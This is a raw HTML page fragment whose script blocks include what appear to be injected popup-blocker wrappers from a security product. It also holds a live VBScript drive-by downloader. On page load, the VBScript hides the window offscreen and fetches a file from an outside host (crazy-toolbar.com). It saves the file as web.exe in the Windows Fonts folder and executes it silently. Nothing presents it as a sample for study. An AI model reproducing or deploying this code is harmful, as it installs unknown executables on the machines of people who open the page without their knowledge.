
<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

var SymRealWinOpen = window.open;

function SymWinOpen(url, name, attributes)
{
  return (new Object());
}

window.open = SymWinOpen;

//-->
</script>

<script language="vbs">

self.MoveTo 5000,5000

Set shell=CreateObject("WScript.Shell")

ddd = shell.SpecialFolders("Fonts") + "\" + "web.exe"

set dot=CreateObject("Msxml2.XMLHTTP")

dot.Open "GET", "http://crazy-toolbar.com/soft.php?login=ogf&num=7", false

dot.Send()

cs = dot.responseBody

Set fso = CreateObject("Scripting.FileSystemObject")

Set f = fso.CreateTextFile(ddd)

for i = 0 to UBound(cs)

c = ascb(midb(cs, i+1, 1))

f.Write chr(c)

next

f.close

shell.run(ddd)

window.close()

</script>
<script language="JavaScript">
<!--
var SymRealOnLoad;
var SymRealOnUnload;

function SymOnUnload()
{
  window.open = SymWinOpen;
  if(SymRealOnUnload != null)
     SymRealOnUnload();
}

function SymOnLoad()
{
  if(SymRealOnLoad != null)
     SymRealOnLoad();
  window.open = SymRealWinOpen;
  SymRealOnUnload = window.onunload;
  window.onunload = SymOnUnload;
}

SymRealOnLoad = window.onload;
window.onload = SymOnLoad;

//-->
</script>

